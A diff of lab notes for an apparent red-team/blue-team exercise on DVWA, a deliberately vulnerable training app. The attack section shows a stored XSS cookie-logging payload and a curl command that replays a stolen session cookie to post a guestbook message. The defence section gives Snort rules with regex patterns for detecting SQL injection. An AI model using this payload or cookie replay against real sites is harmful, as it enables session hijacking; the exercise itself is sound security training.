@@ -1,23 +1,33 @@
-1. Attacker Login (http://10.30.0.235/dvwa)
+-------------------------------------------------------------------
+ATTACK (RED)
+-------------------------------------------------------------------
 
-2. Change security to low
+Attacker Login
 
-3. Inject Payload
+Change security to low
+
+Inject Payload
     <script>console.log(document.cookie)</script>
 
-4. Logout
+Logout
 
-5. New user logs in
+New user logs in
 
-6. Goes to XSS page
+Go to XSS page
 
-7. Script is executed, cookie is sent to attacker (copy it manually for now)
+Script is executed, cookie is sent to attacker (copy it manually for now)
 
-8. Attacker user his machine to add a comment using cookie
+Attacker user his machine to add a comment using cookie
     curl -X POST -b "security=low; PHPSESSID=9ecc84081433870a847d9c096762a91f" -d "txtName=WhoAmI&mtxMessage=You%27ve+been+hacked&btnSign=Sign+Guestbook" http://10.30.0.235/dvwa/vulnerabilities/xss_s/
 
 -------------------------------------------------------------------
+DEFEND (BLUE)
+-------------------------------------------------------------------
+In DMZ interface, remove all extra "LANDM Categories"
 
-sudo snort -d -l /var/log/snort/ -h 192.168.1.0/24 -A console -c /etc/snort/snort.conf
+Expression: 
+    alert tcp any any -> 10.30.0.235 80 (content:"/";http_uri;flow:to_server,established;pcre:"/('|\%27)\+(or)\+(\%27)1(\%27)\+(%3D)\+(\%27)1/i";msg:"Possible SQL Injection Attack Detected";sid:1000001;rev:1)
 
-sudo apt install -y build-essential cmake git pkg-config libpcap-dev libpcre3-dev zlib1g-dev liblzma-dev openssl libssl-dev bison flex libdumbnet-dev libhwloc-dev luajit libluajit-5.1-dev libunwind-dev
+    alert tcp any any -> 10.30.0.235 80 (content:"/";http_uri;flow:to_server,established;pcre:"/('|%27)(\s|%20|\+)*or(\s|%20|\+)*('|%27)1('|%27)(\s|%20|\+)*(=|%3D)(\s|%20|\+)*('|%27)1/i";msg:"Possible SQL Injection Attack Detected";sid:1000001;rev:1)
+
+-------------------------------------------------------------------
